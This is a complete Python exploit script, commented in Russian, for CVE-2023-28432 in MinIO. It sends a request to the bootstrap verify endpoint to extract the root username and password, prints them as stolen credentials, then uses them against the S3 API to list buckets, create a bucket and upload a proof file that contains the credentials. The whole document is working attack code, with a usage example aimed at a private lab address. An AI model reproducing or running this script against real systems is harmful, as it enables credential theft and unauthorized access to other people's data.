#!/usr/bin/env python3
import requests
import boto3
import json
import sys

def exploit_cve_2023_28432(target_url):
    """
    Эксплуатация CVE-2023-28432 для получения credentials MinIO
    """
    try:
        # Эксплуатация CVE-2023-28432
        exploit_url = f"{target_url}/minio/bootstrap/v1/verify"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        print(f"[+] Эксплуатация CVE-2023-28432: {exploit_url}")
        response = requests.post(exploit_url, headers=headers, data="")

        if response.status_code == 200:
            data = response.json()

            # Извлечение credentials
            minio_env = data.get('MinioEnv', {})
            username = minio_env.get('MINIO_ROOT_USER')
            password = minio_env.get('MINIO_ROOT_PASSWORD')

            if username and password:
                print(f"[+] Украденные credentials:")
                print(f"  Username: {username}")
                print(f"  Password: {password}")

                # Информация о кластере
                endpoints = data.get('MinioEndpoints', [])
                if endpoints:
                    print(f"[+] Информация о кластере:")
                    for endpoint in endpoints:
                        print(f"  Узлов: {endpoint.get('SetCount', 'N/A')}")
                        print(f"  Дисков на узел: {endpoint.get('DrivesPerSet', 'N/A')}")

                return username, password
            else:
                print("[-] Credentials не найдены в ответе")
                return None, None
        else:
            print(f"[-] HTTP ошибка: {response.status_code}")
            return None, None

    except Exception as e:
        print(f"[-] Ошибка эксплуатации: {e}")
        return None, None

def exploit_s3_api(target_url, username, password):
    """
    Эксплуатация S3 API с украденными credentials
    """
    try:
        s3_client = boto3.client(
            's3',
            endpoint_url=target_url,
            aws_access_key_id=username,
            aws_secret_access_key=password,
            region_name='us-east-1'
        )

        print(f"[+] Подключение к S3 API: {target_url}")

        # Список bucket'ов
        response = s3_client.list_buckets()
        print(f"[+] Найдено bucket'ов: {len(response['Buckets'])}")
        for bucket in response['Buckets']:
            bucket_name = bucket['Name']
            print(f"  - {bucket_name}")

        # Создание тестового bucket
        test_bucket = "cve-2023-28432-exploit"
        try:
            s3_client.create_bucket(Bucket=test_bucket)
            print(f"[+] Создан bucket: {test_bucket}")
        except Exception as e:
            if "BucketAlreadyOwnedByYou" in str(e):
                print(f"[+] Bucket {test_bucket} уже существует")
            else:
                print(f"[-] Ошибка создания bucket: {e}")

        # Загрузка файла с доказательством
        proof_content = f"CVE-2023-28432 exploitation successful!\nCredentials: {username}:{password}"
        s3_client.put_object(
            Bucket=test_bucket,
            Key='exploitation_proof.txt',
            Body=proof_content.encode('utf-8')
        )
        print(f"[+] Загружен файл exploitation_proof.txt")

        return True

    except Exception as e:
        print(f"[-] Ошибка S3 API: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Использование: python3 minio_cve_exploit.py <target_url>")
        print("Пример: python3 minio_cve_exploit.py http://172.20.0.103:9000")
        sys.exit(1)

    target_url = sys.argv[1]

    # Эксплуатация CVE-2023-28432
    username, password = exploit_cve_2023_28432(target_url)

    if username and password:
        # Эксплуатация S3 API
        exploit_s3_api(target_url, username, password)
    else:
        print("[-] Эксплуатация не удалась")
